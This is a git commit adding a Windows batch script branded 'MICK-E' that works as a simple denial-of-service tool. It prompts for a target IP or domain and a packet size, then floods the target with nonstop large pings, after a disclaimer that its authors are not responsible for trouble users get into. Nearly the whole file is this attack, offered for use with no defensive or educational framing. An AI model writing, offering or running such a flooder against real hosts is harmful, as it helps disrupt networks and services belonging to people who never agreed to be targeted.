8bcf3c7490bb2eb7404832048a9424c26d96eadd
variouz <52836022+variouz@users.noreply.github.com>
2021-11-20 16:17:45 -0800

    Add files via upload

---
+++ MICK-E v1.bat
@@ -0,0 +1,47 @@
+@echo off
+:start
+echo    _______________________________________________________________________
+echo.
+:::               .-"""-.
+:::              /       \		[96m  \  | _ _|  ___| |  /        ____|[0m
+:::              \       /		[96m |\/ |   |  |     | /         __|[0m  
+:::       .-"""-.-`.-.-.<		[96m |   |   |  |     . \ _____|  |[0m    
+:::      /      _,-\ ()()_/:)	[96m_|  _| ___|\____|_|\_\       _____|[0m
+:::      \     / ,  `     `|
+:::       '-..-| \-.,___,  /		   MADE BY VARIOUZ
+:::             \ `-.__/  /
+:::              `-.__.-'`
+for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A
+echo    _______________________________________________________________________
+echo.
+echo    [7mDownload the program at https://variouz.github.io/mick-e[0m
+echo.
+echo    %date% %time%
+echo.
+pause>nul|echo    [Any] Continue [Close Window] Exit
+cls
+echo.
+echo    [96mEnter IP or domain name:[0m
+echo.
+set /p hostname=" "
+cls
+echo.
+echo    [96mEnter amount of bytes to attack with:[0m
+echo.
+set /p amount=" "
+cls
+echo.
+echo     [7mDownload the program at https://variouz.github.io/mick-e[0m
+echo.
+echo     Attacking %input% with %amount% bytes... 
+echo. 
+echo     [96m(we are not responsible for anything you get in trouble for)[0m
+echo.
+ping %hostname% -l %amount% -t
+cls
+echo.
+echo    [7m[91mOne or more valid inputs were not supplied.[0m[0m
+
+timeout /t 10
+cls
+goto start
